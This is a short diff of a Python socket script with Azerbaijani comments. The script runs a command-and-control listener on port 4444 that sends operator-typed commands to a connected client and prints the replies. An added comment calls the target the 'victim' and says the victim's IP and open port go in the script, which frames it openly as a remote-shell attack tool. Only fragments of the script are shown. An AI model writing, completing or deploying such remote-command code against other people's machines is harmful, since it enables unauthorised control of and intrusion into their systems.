@@ -1,6 +1,5 @@
 import socket
-
-# Yerli IP və port
+# Qurbanın açıq portu olmalıdır. Qurbanın IP və açıq port ünvanı bura yazılır :D
 HOST = '127.0.0.1'
 PORT = 4444
 
@@ -22,10 +21,8 @@ def start_server():
                 conn.send(command.encode('utf-8'))
                 break
             
-            # Komandanı client-ə göndər
             conn.send(command.encode('utf-8'))
             
-            # Cavabı qəbul et və ekrana yaz
             response = conn.recv(16384).decode('utf-8', errors='ignore')
             print(response)
             
